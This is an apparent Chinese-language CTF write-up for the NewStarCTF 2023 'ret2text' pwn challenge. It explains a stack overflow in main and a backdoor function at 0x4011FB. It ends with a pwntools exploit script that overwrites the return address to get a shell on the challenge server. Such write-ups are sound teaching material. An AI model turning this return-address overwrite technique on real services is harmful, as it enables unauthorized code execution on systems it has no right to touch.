---
layout: mypost
title: NewStarCTF 2023 公开赛道 ret2text
categories:
  - Pwn
extMath: false
---
_最新修改于  2026-11-22 21:34:45_

查看main可知，此处的栈溢出注入点是buf
![](https://img.h1kari.cn/blog/images/d32c7d818a55c55886b2bfc906f778a4be557034145ff957ea9041040325a70c.webp)

接着查看main的栈帧，可以看到__return_address位于栈偏移8的位置，buf大小是32，算上其中的__saved_registers，那么需要注入40个字符才能替换__return_address
![](https://img.h1kari.cn/blog/images/a5fd676ec6cf6e19bf8357682d7da7e1b8b0d01f5404409b25206ae2bdf48857.webp)

再者能找到位于0x4011FB的backdoor函数
![](https://img.h1kari.cn/blog/images/d1c4d89374bf96190117e98cef61e7a0d7af8792a0506c926c8395fba91ae8a6.webp)

据此则可getshell，随后即可get flag
![](https://img.h1kari.cn/blog/images/d0bf565ee594e148c68331139344e50d95ed0f3be5cb45083824e03e2e74c1a2.webp)

## EXP
```python
from pwn import *

context.arch = "amd64"
io = remote("6c625c8c3147fd13daba6ea5.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="6c625c8c3147fd13daba6ea5.tcp-ctf2.dasctf.com")
payload = b"A" * 40
payload += p64(0x4011FB)
io.sendlineafter(b"Show me your magic", payload)
io.interactive()

```